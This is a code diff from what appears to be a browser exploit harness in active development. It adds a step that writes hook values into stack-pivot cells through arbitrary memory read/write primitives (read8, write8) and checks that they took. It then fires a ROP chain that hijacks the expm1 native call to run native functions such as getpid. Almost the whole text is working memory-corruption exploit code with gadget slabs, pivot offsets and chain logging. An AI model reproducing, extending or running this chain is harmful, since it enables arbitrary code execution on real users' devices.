@@ -76,11 +76,12 @@ import { prepNativeChain, stageGetpid, stageUsleep, fireNativeCall, fireUsleep, 
     bisectFireExpm1, bisectFirePoopsStyle, bisectPreflight, G0_HOOK_OFFS,
     bisectRestore, fireNativeCallBisect, verifyFullChainSet, verifyBisectChainSet, describeSlabLayout,
     patchPrepG5, verifySlabAddrs, probePivotCell, bisectHookPivotAt, bisectHookPivotMulti,
+    verifyPivotHookWrites,
     prepGadgetRvaStale, refreshPrepSlabGadgets,
     CHAIN_POP_ROWS } from "./native_call.js";
 
 const params = new URLSearchParams(location.search);
-const BUILD_ID = "rw-20250830aq";
+const BUILD_ID = "rw-20250830ar";
 
 const NATIVE_BISECT_STEPS = [
     { id: "smoke-now", label: "N0 smoke", title: "atomic layout+fire @ prep (chain_poops callAddr)" },
@@ -91,6 +92,7 @@ const NATIVE_BISECT_STEPS = [
     { id: "hook", label: "N4 hook", title: "hook @ leakval+?hookoff (default +0)" },
     { id: "hook-poops", label: "N4b +0", title: "hook @ leakval+0" },
     { id: "hook-multi", label: "N4m multi", title: "hook @ +0 +20 +28 +30 +38 at once" },
+    { id: "hook-verify", label: "N4v hook", title: "multi-hook + verify readback + snap (NO expm1)" },
     { id: "expm1-lite", label: "N5a exp1", title: "expm1(1) G0 armed — OOM expected (no hook)" },
     { id: "expm1-nohook", label: "N5c obj", title: "expm1(pivotObj) G0 armed NO hook" },
     { id: "expm1", label: "N5 expm1", title: "standalone: sync+layout+multi-hook+expm1 (no N2-N4)" },
@@ -4286,18 +4288,21 @@ function bisectFlushBeforeFire() {
     try { crashLog.flushSync(); } catch (_) { }
 }
 
-function bisectLogHookPost(p, prep) {
-    if (!nativePrep || !nativePrep.pivotCell || !nativePrep.M) return;
-    const s = nativePrep.M.S;
-    const cell = nativePrep.pivotCell;
-    const peeks = [];
-    for (let i = 0; i < G0_HOOK_OFFS.length; i++) {
-        const o = G0_HOOK_OFFS[i];
-        let v = null;
-        try { v = p.read8(cell.add32(o)); } catch (_) { v = null; }
-        peeks.push("+0x" + o.toString(16) + "=" + v);
-    }
-    bisectLog("HOOK-POST", peeks.join(" ") + " want S=" + s);
+function bisectHookVerifyLog(p, prep, hookOffs, tag) {
+    const hv = verifyPivotHookWrites(p, prep, hookOffs);
+    const detail = hv.rows.map(function (r) {
+        return "+0x" + r.off.toString(16) + "=" + (r.ok ? "S" : (r.peek == null ? "null" : r.peek));
+    }).join(" ");
+    bisectLog("HOOK-VERIFY", (tag || "?") + " " + detail
+        + " ok=" + hv.okCount + "/" + hookOffs.length + " want S=" + hv.want);
+    if (!hv.ok)
+        bisectLog("HOOK-FAIL", "write8 did not stick on any slot — run N4p peek, try ?pivot=ta");
+    return hv;
+}
+
+function bisectLogHookPost(p, prep, hookOffs) {
+    if (!prep || !prep.pivotCell || !prep.M) return;
+    bisectHookVerifyLog(p, prep, hookOffs || G0_HOOK_OFFS, "post-fire");
 }
 
 function bisectRunPoopsFire(p, off, hookOffs, tag) {
@@ -4315,11 +4320,15 @@ function bisectRunPoopsFire(p, off, hookOffs, tag) {
         throw new Error("preflight: " + pf.reasons.join("; "));
     bisectLog("ARM-CHK", "mainMf→" + pf.armed + " G0=" + pf.g0
         + " pivotCell=" + nativePrep.pivotCell);
-    bisectSnapshot(p, nativePrep, off, "pre-" + tag);
+    bisectHookPivotMulti(p, nativePrep, hookOffs);
+    const hv = bisectHookVerifyLog(p, nativePrep, hookOffs, tag);
+    bisectSnapshot(p, nativePrep, off, "post-hook-" + tag);
     bisectFlushBeforeFire();
-    bisectLog("BISECT-WARN", tag + " multi-hook poops fire…");
-    const pid = bisectFirePoopsStyle(p, nativePrep, hookOffs);
-    bisectLogHookPost(p, nativePrep);
+    if (!hv.ok)
+        throw new Error("hook verify failed — no pivot slot reads S after write8");
+    bisectLog("BISECT-WARN", tag + " expm1 fire (hook verified)…");
+    const pid = bisectFirePoopsStyle(p, nativePrep, hookOffs, { skipSetup: true, skipHook: true });
+    bisectLogHookPost(p, nativePrep, hookOffs);
     return pid;
 }
 
@@ -4379,10 +4388,28 @@ function bisectLog(tag, detail) {
 function bisectSnapshot(p, prep, off, label) {
     if (!prep || !p) return;
     const mainNow = prep.mainMf ? p.read8(prep.mainMf) : null;
-    const site = prep._bisect && prep._bisect.pivotSite;
-    let hookPeek = null;
-    if (site) {
-        try { hookPeek = p.read8(site); } catch (_) { hookPeek = null; }
+    const bis = prep._bisect || {};
+    let hookSiteStr = "—";
+    if (bis.multiSaved && bis.multiSaved.length) {
+        hookSiteStr = bis.multiSaved.map(function (e) {
+            return "cell+0x" + e.off.toString(16);
+        }).join(",");
+    } else if (bis.pivotSite) {
+        hookSiteStr = String(bis.pivotSite);
+    }
+    let hookPeek = "—";
+    if (bis.multiSaved && bis.multiSaved.length && prep.M && prep.M.S) {
+        let n = 0;
+        for (let i = 0; i < bis.multiSaved.length; i++) {
+            let v = null;
+            try { v = p.read8(bis.multiSaved[i].site); } catch (_) { v = null; }
+            if (v != null && String(v) === String(prep.M.S)) n++;
+        }
+        hookPeek = n + "/" + bis.multiSaved.length + "=S";
+    } else if (bis.pivotSite) {
+        let v = null;
+        try { v = p.read8(bis.pivotSite); } catch (_) { v = null; }
+        hookPeek = v == null ? "null" : String(v);
     }
     let slab = null;
     try { slab = verifySlabAddrs(p, prep); } catch (_) { }
@@ -4391,7 +4418,7 @@ function bisectSnapshot(p, prep, off, label) {
         + " mainMf=" + prep.mainMf + " now=" + mainNow + " G0=" + prep.G.G0
         + " orig=" + prep.mainOrig
         + " pivotCell=" + prep.pivotCell
-        + " hookSite=" + (site || "—") + " hookPeek=" + hookPeek
+        + " hookSite=" + hookSiteStr + " hookPeek=" + hookPeek
         + " S=" + (prep.M && prep.M.S)
         + (slab ? " slab S=" + slab.S.ok + " K=" + slab.K.ok
             + (slab.rsp ? " rsp=" + slab.rsp.ok : "") : ""));
@@ -4505,10 +4532,22 @@ function runNativeBisectStep(stepId) {
             break;
         case "hook-multi":
             requireNativePrep();
-            bisectHookPivotMulti(p, nativePrep, [0x0, 0x20, 0x28, 0x30, 0x38]);
+            bisectHookPivotMulti(p, nativePrep, G0_HOOK_OFFS);
+            bisectHookVerifyLog(p, nativePrep, G0_HOOK_OFFS, "N4m");
             bisectSnapshot(p, nativePrep, off, "post-N4m");
-            bisectLog("BISECT-OK", "N4m multi-hook +0 +20 +28 +30 +38 → S=" + nativePrep.M.S);
+            bisectLog("BISECT-OK", "N4m multi-hook → S=" + nativePrep.M.S);
             state("N4m multi OK", "ok");
+            break;
+        case "hook-verify":
+            requireNativePrep();
+            bisectPrepSync(p, off, "pre-N4v");
+            layoutSmokeStack(nativePrep);
+            bisectArmG0(p, nativePrep);
+            bisectHookPivotMulti(p, nativePrep, G0_HOOK_OFFS);
+            bisectHookVerifyLog(p, nativePrep, G0_HOOK_OFFS, "N4v");
+            bisectSnapshot(p, nativePrep, off, "post-N4v");
+            bisectLog("BISECT-OK", "N4v hook verified — NO expm1 (safe)");
+            state("N4v hook OK", "ok");
             break;
         case "expm1-lite":
             requireNativePrep();
